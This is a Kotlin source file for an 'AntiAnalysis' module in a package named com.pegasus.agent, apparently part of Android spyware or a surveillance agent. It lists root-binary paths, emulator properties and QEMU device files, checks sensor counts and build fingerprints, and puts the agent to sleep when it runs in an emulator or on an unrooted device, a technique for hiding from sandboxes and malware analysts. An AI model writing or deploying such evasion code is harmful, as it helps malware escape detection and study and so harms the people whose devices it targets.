package com.pegasus.agent

import android.content.Context
import android.os.Build
import java.io.File

object AntiAnalysis {
    private val ROOT_PATHS = listOf(
        "/system/app/Superuser.apk", "/sbin/su", "/system/bin/su", "/system/xbin/su",
        "/data/local/xbin/su", "/data/local/bin/su", "/system/sd/xbin/su",
        "/system/bin/failsafe/su", "/data/local/su", "/su/bin/su",
        "/sbin/.magisk", "/data/adb/magisk", "/data/adb/modules")

    private val EMU_PROPS = mapOf(
        "ro.hardware" to setOf("goldfish", "ranchu", "vbox86"),
        "ro.product.model" to setOf("sdk", "google_sdk", "Emulator",
                                    "Android SDK built for x86"),
        "ro.kernel.qemu" to setOf("1"),
        "ro.build.flavor" to setOf("sdk_gphone_x86", "sdk_phone_x86"))

    private val EMU_FILES = listOf("/dev/socket/qemud", "/dev/qemu_pipe",
        "/system/lib/libc_malloc_debug_qemu.so", "/sys/qemu_trace", "/system/bin/qemu-props")

    fun isRooted(): Boolean = ROOT_PATHS.any { File(it).exists() } ||
        runCatching { Runtime.getRuntime().exec(arrayOf("sh", "-c", "which su"))
            .waitFor() == 0 }.getOrDefault(false)

    fun isEmulator(ctx: Context): Boolean {
        if (EMU_PROPS.any { (k, v) -> prop(k) in v }) return true
        if (EMU_FILES.any { File(it).exists() }) return true
        if (Build.FINGERPRINT.startsWith("generic") || Build.FINGERPRINT.contains("vbox")) return true
        if (Build.MODEL.contains("Emulator") || Build.MANUFACTURER.contains("Genymotion")) return true
        val mgr = ctx.getSystemService(Context.SENSOR_SERVICE)
            as android.hardware.SensorManager
        return mgr.getSensorList(android.hardware.Sensor.TYPE_ALL).size < 8
    }

    private fun prop(key: String): String = runCatching {
        Runtime.getRuntime().exec(arrayOf("getprop", key))
            .inputStream.bufferedReader().readText().trim()
    }.getOrDefault("")

    fun shouldSleep(ctx: Context, strict: Boolean): Boolean =
        strict && (isEmulator(ctx) || !isRooted())
}
